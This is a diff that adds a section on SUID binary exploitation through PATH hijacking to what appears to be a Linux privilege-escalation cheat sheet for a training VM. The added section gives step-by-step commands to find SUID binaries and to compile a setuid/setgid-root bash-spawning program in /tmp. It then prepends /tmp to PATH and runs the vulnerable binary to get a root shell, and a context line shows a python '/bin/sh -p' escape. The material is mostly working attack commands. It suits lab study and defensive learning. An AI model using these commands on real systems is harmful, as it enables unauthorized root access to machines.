@@ -103,6 +103,28 @@ gcc -shared -o /home/user/.config/libcalc.so -fPIC /home/user/.config/libcalc.c
 10. In command prompt type: /usr/local/bin/suid-so
 11. In command prompt type: id
 ```
+### SUID(ENV Variable )
+```
+Detection
+
+Linux VM
+
+1. In command prompt type: find / -type f -perm -04000 -ls 2>/dev/null
+2. From the output, make note of all the SUID binaries.
+3. In command prompt type: strings /usr/local/bin/suid-env
+4. From the output, notice the functions used by the binary.
+
+Exploitation
+
+Linux VM
+
+1. In command prompt type:
+echo 'int main() { setgid(0); setuid(0); system("/bin/bash"); return 0; }' > /tmp/service.c
+2. In command prompt type: gcc /tmp/service.c -o /tmp/service
+3. In command prompt type: export PATH=/tmp:$PATH
+4. In command prompt type: /usr/local/bin/suid-env
+5. In command prompt type: id
+```
 ```
 ---------------------------------------------
 python -c 'import os;os.execl("/bin/sh","sh","-p")'
